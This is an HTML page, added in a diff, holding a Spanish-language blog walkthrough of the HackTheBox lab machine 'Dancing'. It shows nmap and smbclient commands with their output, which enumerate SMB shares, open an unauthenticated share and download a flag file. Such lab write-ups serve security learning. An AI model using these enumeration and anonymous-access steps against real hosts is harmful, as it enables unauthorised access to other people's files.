@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Dancing HTB Walkthrough</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Dancing HTB Walkthrough | cblog.h</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Dancing HTB Walkthrough" />
+<meta name="author" content="n4ibu3" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Dancing HTB" />
+<meta property="og:description" content="Dancing HTB" />
+<link rel="canonical" href="http://localhost:8000/Dancing-HTB-walkthrough" />
+<meta property="og:url" content="http://localhost:8000/Dancing-HTB-walkthrough" />
+<meta property="og:site_name" content="cblog.h" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-04-26T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Dancing HTB Walkthrough" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"n4ibu3","url":"https://ashishchaudhary.in/hacker-blog"},"dateModified":"2022-04-26T00:00:00+02:00","datePublished":"2022-04-26T00:00:00+02:00","description":"Dancing HTB","headline":"Dancing HTB Walkthrough","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Dancing-HTB-walkthrough"},"url":"http://localhost:8000/Dancing-HTB-walkthrough"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>n4ibu3@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<!--<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>-->
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Dancing HTB Walkthrough</h2>
+  <time datetime="2022-04-26T00:00:00+02:00" class="by-line">26 Apr 2022</time>
+  <h1 id="dancing-htb">Dancing HTB</h1>
+
+<p>En este artículo trataré la resolución de una de las máquinas del Tier 0 de HackTheBox.</p>
+
+<h2 id="fase-de-reconocimiento">Fase de reconocimiento</h2>
+
+<p>Tras ejecutar nmap obtenemos la siguiente respuesta:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$nmap -sCV 10.129.1.12
+
+Nmap scan report for 10.129.1.12
+Host is up (0.12s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE       VERSION
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+│ Host script results:
+|_clock-skew: 4h04m24s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-04-26T23:38:28
+|_  start_date: N/A
+</code></pre></div></div>
+
+<p>Vemos que el puerto 445 se encuentra abierto y corre smb. Por lo que tratamos de listar los 
+recursos compartidos.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$smbclient -L //10.129.1.12/
+
+Enter WORKGROUP\ 's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	WorkShares      Disk      
+SMB1 disabled -- no workgroup available
+</code></pre></div></div>
+
+<p>Vemos que el recurso <code class="language-plaintext highlighter-rouge">WorkShares</code> no requiere de autenticación, por lo que tratamos de acceder:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$smbclient //10.129.1.12/WorkShares
+
+smb: \&gt; ls
+  .                                   D        0  Mon Mar 29 10:22:01 2021
+  ..                                  D        0  Mon Mar 29 10:22:01 2021
+  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
+  James.P                             D        0  Thu Jun  3 10:38:03 2021
+
+		5114111 blocks of size 4096. 1752259 blocks available
+
+smb: \&gt; cd James.P\
+
+smb: \James.P\&gt; ls
+  .                                   D        0  Thu Jun  3 10:38:03 2021
+  ..                                  D        0  Thu Jun  3 10:38:03 2021
+  flag.txt                            A       32  Mon Mar 29 11:26:57 2021
+
+		5114111 blocks of size 4096. 1752524 blocks available
+
+smb: \James.P\&gt; get flag.txt 
+getting file \James.P\flag.txt of size 32 as flag.txt (0,1 KiloBytes/sec) (average 0,2 KiloBytes/sec)
+
+smb: \James.P\&gt; quit
+</code></pre></div></div>
+
+<p>Vemos que en el directorio <code class="language-plaintext highlighter-rouge">James.P</code> hay un archivo <code class="language-plaintext highlighter-rouge">flag.txt</code>, lo descargamos con <code class="language-plaintext highlighter-rouge">get</code> y comprobamos que es la flag.</p>
+
+<p>Muchas gracias por leer el post, y seguid hack.</p>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>n4ibu3</b>
+    </span>
+    
+    <span>© 2022</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
